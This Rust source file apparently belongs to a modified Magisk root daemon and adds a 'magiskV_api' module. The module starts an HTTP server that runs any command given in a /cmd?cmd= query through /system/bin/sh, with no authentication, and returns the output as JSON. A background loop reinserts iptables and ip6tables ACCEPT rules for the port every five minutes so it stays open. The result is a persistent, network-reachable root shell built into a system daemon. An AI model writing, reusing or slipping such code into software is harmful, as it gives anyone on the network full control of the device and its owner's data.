use crate::daemon::MagiskD;
use crate::consts::DEFAULT_ADDR;
use base::{debug, error, info, warn};

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::Command;
use std::sync::atomic::Ordering;
use std::time::Duration;

pub fn start_magiskV_api_if_enabled(daemon: &MagiskD) {

    if daemon.magiskV_api_started.swap(true, Ordering::AcqRel) {
        return;
    }

    let addr = DEFAULT_ADDR.to_string();

    info!("* magiskV_api starting on {addr}");

    std::thread::spawn(move || run_http_server(addr));
}

fn run_http_server(addr: String) {

    let port = get_port(&addr);

    firewall_self_heal(port.clone());

    let Ok(listener) = TcpListener::bind(&addr) else {
        error!("* HTTP API bind failed on {addr}");
        return;
    };

    info!("* HTTP API listening on {addr}");

    for stream in listener.incoming() {

        match stream {

            Ok(stream) => {
                std::thread::spawn(move || handle_connection(stream));
            }

            Err(e) => {
                warn!("HTTP API accept failed: {e}");
            }

        }

    }

}

fn get_port(addr: &str) -> String {
    addr.split(':').last().unwrap_or("80").to_string()
}

fn firewall_self_heal(port: String) {

    std::thread::spawn(move || {

        loop {

            let cmd = format!(
                "
iptables -C INPUT -p tcp --dport {0} -j ACCEPT 2>/dev/null || iptables -I INPUT 1 -p tcp --dport {0} -j ACCEPT;
iptables -C OUTPUT -p tcp --sport {0} -j ACCEPT 2>/dev/null || iptables -I OUTPUT 1 -p tcp --sport {0} -j ACCEPT;

ip6tables -C INPUT -p tcp --dport {0} -j ACCEPT 2>/dev/null || ip6tables -I INPUT 1 -p tcp --dport {0} -j ACCEPT;
ip6tables -C OUTPUT -p tcp --sport {0} -j ACCEPT 2>/dev/null || ip6tables -I OUTPUT 1 -p tcp --sport {0} -j ACCEPT;
                ",
                port
            );

            let _ = Command::new("/system/bin/sh")
                .arg("-c")
                .arg(cmd)
                .output();

            std::thread::sleep(Duration::from_secs(300));

        }

    });

}

fn handle_connection(mut stream: TcpStream) {

    if let Ok(addr) = stream.peer_addr() {
        debug!("magiskV_api: connection from {}", addr);
    }

    let mut req = [0_u8; 8192];

    let Ok(n) = stream.read(&mut req) else {
        return;
    };

    if n == 0 {
        return;
    }

    let line = String::from_utf8_lossy(&req[..n]);

    let Some(first_line) = line.lines().next() else {

        write_json(&mut stream, 400, r#"{"error":"bad request"}"#);
        return;

    };

    let mut parts = first_line.split_whitespace();

    let method = parts.next().unwrap_or("");
    let target = parts.next().unwrap_or("");

    debug!("magiskV_api: request {} {}", method, target);

    if method != "GET" {

        write_json(&mut stream, 405, r#"{"error":"only GET supported"}"#);
        return;

    }

    if target == "/status" {

        write_json(&mut stream, 200, r#"{"status":"ok"}"#);
        return;

    }

    let Some(cmd) = extract_cmd(target) else {

        write_json(
            &mut stream,
            400,
            r#"{"usage":"/cmd?cmd=pm%20list%20packages"}"#,
        );

        return;

    };

    debug!("magiskV_api: exec cmd='{}'", cmd);

    let mut shell = Command::new("/system/bin/sh");
    shell.arg("-c").arg(&cmd);

    match shell.output() {

        Ok(out) => {

            let exit = out.status.code().unwrap_or(-1);

            let stdout = json_escape(&String::from_utf8_lossy(&out.stdout));
            let stderr = json_escape(&String::from_utf8_lossy(&out.stderr));

            let body = format!(
                "{{\"exit\":{},\"stdout\":\"{}\",\"stderr\":\"{}\"}}",
                exit, stdout, stderr
            );

            write_json(&mut stream, 200, &body);

        }

        Err(e) => {

            let body = format!(
                "{{\"error\":\"command execution failed: {}\"}}",
                json_escape(&e.to_string())
            );

            write_json(&mut stream, 500, &body);

        }

    }

}

fn extract_cmd(target: &str) -> Option<String> {

    let (path, query) = target.split_once('?')?;

    if path != "/cmd" {
        return None;
    }

    query_param(query, "cmd").map(url_decode)
}

fn query_param<'a>(query: &'a str, key: &str) -> Option<&'a str> {

    for kv in query.split('&') {

        let (k, v) = kv.split_once('=').unwrap_or((kv, ""));

        if k == key {
            return Some(v);
        }

    }

    None
}

fn url_decode(s: &str) -> String {

    let mut out = String::with_capacity(s.len());

    let b = s.as_bytes();
    let mut i = 0;

    while i < b.len() {

        if b[i] == b'+' {
            out.push(' ');
            i += 1;
            continue;
        }

        if b[i] == b'%' && i + 2 < b.len() {

            let h1 = (b[i + 1] as char).to_digit(16);
            let h2 = (b[i + 2] as char).to_digit(16);

            if let (Some(h1), Some(h2)) = (h1, h2) {

                out.push(((h1 * 16 + h2) as u8) as char);
                i += 3;
                continue;

            }

        }

        out.push(b[i] as char);
        i += 1;

    }

    out
}

fn json_escape(s: &str) -> String {

    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "")

}

fn write_json(stream: &mut TcpStream, status: i32, body: &str) {
    write_raw_response(stream, status, body.as_bytes());
}

fn write_raw_response(stream: &mut TcpStream, status: i32, body: &[u8]) {

    let status_text = match status {
        200 => "OK",
        400 => "Bad Request",
        405 => "Method Not Allowed",
        500 => "Internal Server Error",
        _ => "OK",
    };

    let _ = stream.write_all(
        format!(
            "HTTP/1.1 {status} {status_text}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            body.len()
        )
        .as_bytes(),
    );

    let _ = stream.write_all(body);
    let _ = stream.flush();

}
